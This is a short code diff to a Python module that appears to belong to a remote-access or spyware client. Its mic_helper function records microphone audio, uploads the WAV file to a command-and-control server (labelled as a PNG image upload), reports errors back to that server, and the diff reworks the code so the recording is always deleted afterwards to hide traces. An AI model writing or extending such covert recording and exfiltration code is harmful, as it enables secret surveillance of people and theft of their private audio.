@@ -7,7 +7,6 @@ import sounddevice as sd
 from scipy.io.wavfile import write
 from constants import CONTROL
 
-
 def handle_mic(message):
     try:
         split = message.split(" ")
@@ -18,6 +17,7 @@ def handle_mic(message):
     except Exception as e: return f"Error in handle_mic(): {e}"
 
 def mic_helper(seconds):
+    fpath = ""
     try:
         sd.default.reset()
         fs = 44100 
@@ -32,8 +32,11 @@ def mic_helper(seconds):
         with open(fpath, 'rb') as file:
             requests.post(f"{CONTROL}/upload", files={'image': ("testing22.wav", file, 'image/png')})
 
-        os.remove(fpath)
-
     except Exception as e:
-            headers = {'Content-Type': 'text/plain'}
-            requests.post(CONTROL, data=f"Failed to send audio: {e}", headers=headers)
+        headers = {'Content-Type': 'text/plain'}
+        requests.post(CONTROL, data=f"Failed to send audio: {e}", headers=headers)
+
+    try: os.remove(fpath)
+    except Exception as e:
+        headers = {'Content-Type': 'text/plain'}
+        requests.post(CONTROL, data=f"Failed to remove audio temp file: {e}", headers=headers)
